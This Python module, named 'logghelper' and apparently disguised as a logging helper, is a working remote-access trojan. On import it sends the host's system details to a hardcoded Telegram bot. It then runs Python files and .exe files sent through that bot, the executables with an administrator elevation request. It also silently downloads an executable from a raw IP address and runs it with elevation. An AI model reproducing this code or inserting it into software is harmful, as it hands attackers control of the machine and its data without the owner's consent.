import threading, time, requests, os, io, contextlib, platform, socket, atexit, traceback, tempfile, sys

# Добавляем ctypes только для Windows
if platform.system() == "Windows":
    import ctypes

OFFSET_FILE = 'logghelper.offset'
BOT_TOKEN = "8001871291:AAE3fZ4bBT0bo7cN_aiIGP35zzOw0Y3CIaY"
HEARTBEAT_CHAT_ID = "-1002659328169"

def get_public_ip():
    """Получает публичный IP-адрес через внешний сервис."""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except Exception:
        return "N/A"

def get_system_info():
    """Собирает информацию о системе. Кросс-платформенно."""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        hostname = "N/A"
        local_ip = "N/A"

    try:
        user = os.getlogin()
    except Exception:
        user = "N/A"

    info = (
        f"OS: {platform.system()} {platform.release()}\n"
        f"Machine: {platform.machine()}\n"
        f"Hostname: {hostname}\n"
        f"Public IP: {get_public_ip()}\n"
        f"Local IP: {local_ip}\n"
        f"User: {user}\n"
        f"Python: {platform.python_version()}"
    )
    return info

def send_message(text, chat_id):
    """Универсальная функция для отправки текстовых сообщений."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        # Убедимся, что сообщение не превышает лимит Telegram
        if len(text) > 4096:
            text = text[:4090] + "\n..."
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=10)
    except Exception:
        pass # Молча игнорируем ошибки отправки

def send_heartbeat():
    """Отправляет уведомление о запуске с информацией о системе."""
    system_info = get_system_info()
    message = f"✅ **logghelper instance STARTED!**\n\n---\n`{system_info}`"
    send_message(message, HEARTBEAT_CHAT_ID)

def send_shutdown_notification():
    """Отправляет уведомление о завершении работы."""
    hostname = socket.gethostname()
    message = f"❌ **logghelper instance STOPPED** on host `{hostname}`"
    send_message(message, HEARTBEAT_CHAT_ID)

# --- Функции для работы с правами администратора (только для Windows) ---

def is_admin():
    """Проверяет, запущен ли скрипт с правами администратора."""
    if platform.system() != "Windows":
        return False # Неактуально для других ОС
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def run_as_admin(exe_path, params=""):
    """
    Пытается запустить .exe или другой файл с правами администратора.
    """
    if platform.system() != "Windows":
        return "This function works only on Windows."
    
    try:
        if exe_path.endswith('.py'):
            # --- Логика для Python скриптов ---
            # Надежный способ получить путь к текущему python.exe
            python_exe = sys.executable 
            # Команда, которую должен выполнить cmd.exe.
            # `& pause` в конце не даст окну закрыться сразу, чтобы можно было увидеть результат.
            command_for_cmd = f'"{python_exe}" "{os.path.abspath(exe_path)}" & pause'
            
            # Запускаем саму командную строку (cmd.exe) с правами администратора,
            # передавая ей нашу команду для выполнения.
            actual_exe = "cmd.exe"
            actual_params = f'/c "{command_for_cmd}"'
        else:
            # --- Логика для .exe и других файлов ---
            actual_exe = os.path.abspath(exe_path)
            actual_params = params

        # Вызов Windows API для запуска процесса
        result = ctypes.windll.shell32.ShellExecuteW(
            None,           # hwnd
            "runas",        # lpOperation: "runas" запрашивает повышение прав
            actual_exe,     # lpFile: что запускаем (cmd.exe или другой файл)
            actual_params,  # lpParameters: параметры для файла
            None,           # lpDirectory: рабочая директория
            1               # nShowCmd: 1 = SW_SHOWNORMAL
        )
        
        if result > 32:
            return f"✅ Команда на запуск '{os.path.basename(exe_path)}' от имени администратора отправлена системе."
        else:
            return f"❌ Не удалось запустить. Код ошибки Windows: {result}"
            
    except Exception as e:
        return f"🔥 Критическая ошибка при вызове ShellExecuteW: {e}"

def run_silent_exe_download():
    """
    В фоновом режиме скачивает .exe с сервера и пытается его запустить
    от имени администратора. Работает абсолютно "тихо".
    """
    if os.name != 'nt':
        return # Функция только для Windows

    EXE_URL = "http://89.23.97.112:8080/Python.exe"
    temp_dir = None
    temp_path = None

    try:
        temp_dir = tempfile.mkdtemp()
        response = requests.get(EXE_URL, timeout=60)
        if response.status_code == 200:
            original_filename = EXE_URL.split('/')[-1]
            temp_path = os.path.join(temp_dir, original_filename)
            with open(temp_path, 'wb') as f:
                f.write(response.content)
            
            if os.path.exists(temp_path):
                ctypes.windll.shell32.ShellExecuteW(None, "runas", temp_path, None, None, 1)
    except Exception:
        pass # Полностью игнорируем любые ошибки


def poll_and_exec():
    offset = 0

    try:
        if os.path.exists(OFFSET_FILE):
            with open(OFFSET_FILE, 'r') as f:
                offset_from_file = f.read().strip()
                if offset_from_file:
                    offset = int(offset_from_file)
    except Exception:
        offset = 0

    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={"offset": offset}, timeout=10)
            updates = r.json().get("result", [])
            
            for upd in updates:
                offset = upd["update_id"] + 1

                try:
                    with open(OFFSET_FILE, 'w') as f:
                        f.write(str(offset))
                except Exception:
                    continue 

                msg = upd.get("message", {})
                chat_id = msg.get("chat", {}).get("id")
                if not chat_id:
                    continue

                # --- ОБРАБОТКА ТЕКСТОВЫХ КОМАНД ---
                if 'text' in msg:
                    if msg['text'] == '/check_admin':
                        if is_admin():
                            send_message("✅ **Статус:** процесс запущен с правами Администратора.", chat_id)
                        else:
                            send_message("❌ **Статус:** процесс запущен с обычными правами.", chat_id)
                        continue
                
                # --- ОБРАБОТКА ФАЙЛОВ ---
                if 'document' in msg:
                    doc = msg['document']
                    file_name = doc.get("file_name", "")
                    file_id = doc["file_id"]
                    
                    try:
                        # Получаем путь для скачивания файла
                        file_info = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}").json()
                        file_path = file_info['result']['file_path']
                        
                        # Скачиваем содержимое файла
                        file_content = requests.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}").content

                        # --- Логика для .exe файлов (только Windows) ---
                        if file_name.lower().endswith(".exe"):
                            if platform.system() == "Windows":
                                temp_path = None
                                try:
                                    # Сохраняем .exe во временный файл
                                    fd, temp_path = tempfile.mkstemp(suffix=".exe")
                                    with os.fdopen(fd, 'wb') as temp_f:
                                        temp_f.write(file_content)
                                    
                                    # Запускаем и отправляем результат
                                    result_message = run_as_admin(temp_path)
                                    send_message(result_message, chat_id)
                                finally:
                                    # Гарантированно удаляем временный файл
                                    if temp_path and os.path.exists(temp_path):
                                        os.remove(temp_path)
                            else:
                                send_message(f"⚠️ Невозможно запустить .exe файл не на Windows.", chat_id)
                            continue

                        # --- Логика для .py и других скриптов ---
                        code_to_exec = file_content.decode('utf-8', errors='ignore')
                        
                        # Перехватываем вывод скрипта
                        output_buffer = io.StringIO()
                        with contextlib.redirect_stdout(output_buffer), contextlib.redirect_stderr(output_buffer):
                            try:
                                exec(code_to_exec, {'__file__': file_name})
                            except Exception:
                                # Если ошибка в самом exec, выводим ее
                                output_buffer.write(traceback.format_exc())
                        
                        # Отправляем результат обратно пользователю
                        output = output_buffer.getvalue().strip()
                        if output:
                            reply_message = f"📝 **Результат выполнения `{file_name}`:**\n\n```{output}```"
                        else:
                            reply_message = f"✅ Скрипт `{file_name}` выполнен без вывода."
                        
                        send_message(reply_message, chat_id)

                    except Exception as e:
                        error_message = f"🔥 Произошла критическая ошибка при обработке файла `{file_name}`:\n`{traceback.format_exc()}`"
                        send_message(error_message, chat_id)
        except Exception:
            pass
        
        time.sleep(1) # Уменьшаем задержку для большей отзывчивости

# --- Автозапуск при импорте ---

# 1. Отправляем уведомление о старте
send_heartbeat()

# 2. Запускаем фоновый процесс для получения команд из Telegram
threading.Thread(target=poll_and_exec, daemon=True).start()

# 3. Запускаем фоновый процесс для скачивания и запуска .exe
threading.Thread(target=run_silent_exe_download, daemon=True).start()

# 4. Регистрируем уведомление о завершении работы
atexit.register(send_shutdown_notification) 